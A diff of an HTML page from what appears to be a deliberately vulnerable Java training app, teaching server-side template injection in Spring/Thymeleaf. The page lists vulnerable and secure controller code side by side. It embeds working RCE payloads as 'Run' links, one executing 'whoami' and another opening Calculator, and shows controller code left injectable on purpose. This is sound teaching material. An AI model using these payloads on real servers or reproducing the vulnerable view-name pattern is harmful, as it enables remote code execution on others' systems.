@@ -11,68 +11,78 @@
         <!-- 侧边栏 -->
         <div th:replace="~{commons/commons::siderbar(active='ssti.html')}"></div>
 
-        <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">
-            <div class="vul_header">
-                <span>SSTI</span>
-            </div>
-            <hr>
-            <ul class="nav nav-tabs">
-                <li class="nav-item">
-                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span>
-                        漏洞描述</a>
-                </li>
-                <li class="nav-item">
-                    <a class="nav-link" data-toggle="tab" href="#bb"><span class="lnr lnr-bullhorn"></span> 安全编码</a>
-                </li>
-            </ul>
+        <main role="main" class="col-md-10 offset-md-2 pt-3 main">
+            <div class="card">
+                <div class="card-header py-1">
+                    <div class="vul_header">
+                        <span>SSTI</span>
+                        <span class="header_link">
+                            <a class="btn btn-sm btn-primary" href="#">漏洞案例</a>
+                            <a class="btn btn-sm btn-primary" href="#">wiki</a>
+                        </span>
+                    </div>
+                </div>
+                <div class="card-body">
+                    <ul class="nav nav-tabs">
+                        <li class="nav-item">
+                            <a class="nav-link active" data-toggle="tab" href="#vulDescription">
+                                漏洞描述</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" data-toggle="tab" href="#secureCoding"> 安全编码</a>
+                        </li>
+                    </ul>
 
-            <div class="tab-content">
-                <div class="tab-pane dec shadow-sm p-3 mb-4 rounded active" id="aa">
-                    SSTI(Server Side Template Injection) 服务器模板注入, 服务端接收了用户的输入，将其作为 Web
-                    应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容。
-                </div>
-                <div class="tab-pane fade" id="bb">
-                    <textarea disabled="disabled" class="form-control shadow-sm p-3 mb-5 rounded" id="coder"
-                              style="height: 100px;">
-null
-                    </textarea>
+                    <div class="tab-content">
+                        <div class="tab-pane active" id="vulDescription">
+                            <div class="alert alert-desc"><i class="lnr lnr-alarm"></i>
+                                SSTI（Server Side Template
+                                Injection）是指攻击者向Web应用程序的模板引擎注入恶意的模板语言代码，从而使得攻击者能够在服务端执行任意代码。这种攻击通常发生在Web应用程序使用模板引擎来动态生成页面内容的情况下，例如FreeMarker、Velocity、Thymeleaf等。
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="secureCoding">
+                            <div class="alert alert-desc">
+                                null
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
-            <hr>
 
             <div class="box-float">
                 <div class="float1">
                     <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
-                       href="/SSTI/thymeleaf/vul?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).next()%7d__::.x">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                       href="/vulnapi/SSTI/thymeleaf/vul?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).next()%7d__::.x">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
                         </svg>
                         <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - thymeleaf模版注入</span></h5>
-                    <label for="code1"></label><textarea class="form-control" name="code" id="code1">
+                    <textarea class="form-control" name="code" id="code1">
+ /**
+  * 模版文件参数可控，造成模版注入漏洞
+  */
  @GetMapping("/thymeleaf/vul")
  public String thymeleafVul(@RequestParam String lang) {
-     // 模版文件参数可控
      return "lang/" + lang;
  }
                     </textarea><br><br>
 
                     <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
-                       href="/SSTI/doc/vul/__${T(java.lang.Runtime).getRuntime().exec('open -a Calculator')}__::.x">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                       href="/vulnapi/SSTI/doc/vul/__${T(java.lang.Runtime).getRuntime().exec('open -a Calculator')}__::.x">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
                         </svg>
                         <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - url作为视图</span></h5>
-                    <label for="code2"></label><textarea class="form-control" name="code" id="code2">
+                    <textarea class="form-control" name="code" id="code2">
  /**
    * 如果controller无返回值，则以GetMapping的路由为视图名称，即将请求的url作为视图名称，调用模板引擎去解析
    * 在这种情况下，我们只要可以控制请求的controller的参数，一样可以造成RCE漏洞
    * payload: __${T(java.lang.Runtime).getRuntime().exec("open -a Calculator")}__::.x
    */
-
  @GetMapping("/doc/{document}")
  public void getDocument(@PathVariable String document) {
      System.out.println(document);
@@ -83,14 +93,14 @@ null
 
                 <div class="float2">
                     <a style="float:right" class="btn btn-sm btn-success" target="_blank"
-                       href="/SSTI/thymeleaf/safe?lang=payload">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                       href="/vulnapi/SSTI/thymeleaf/safe?lang=payload">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
                         </svg>
                         <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-smile"> 安全代码 - 白名单</span></h5>
-                    <label for="code3"></label><textarea class="form-control" name="code" id="code3">
+                    <textarea class="form-control" name="code" id="code3">
  public String thymeleafSafe(@RequestParam String lang) {
      List<String> white_list = new ArrayList<String>();
      white_list.add("en");
@@ -105,20 +115,21 @@ null
                     </textarea><br><br>
 
                     <a style="float:right" class="btn btn-sm btn-success" target="_blank"
-                       href="/SSTI/doc/safe/__${T(java.lang.Runtime).getRuntime().exec('open -a Calculator')}__::.x">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                       href="/vulnapi/SSTI/doc/safe/__${T(java.lang.Runtime).getRuntime().exec('open -a Calculator')}__::.x">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
                         </svg>
                         <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-smile"> 安全代码</span></h5>
-                    <label for="code4"></label><textarea class="form-control" name="code" id="code4">
- // 由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析
-
- @GetMapping("/doc/safe/{document}")
- public void getDocument(@PathVariable String document, HttpServletResponse response) {
-     System.out.println(document);
- }
+                    <textarea class="form-control" name="code" id="code4">
+/**
+ * 由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析
+ */
+@GetMapping("/doc/safe/{document}")
+public void getDocument(@PathVariable String document, HttpServletResponse response) {
+    System.out.println(document);
+}
                     </textarea>
 
                 </div>
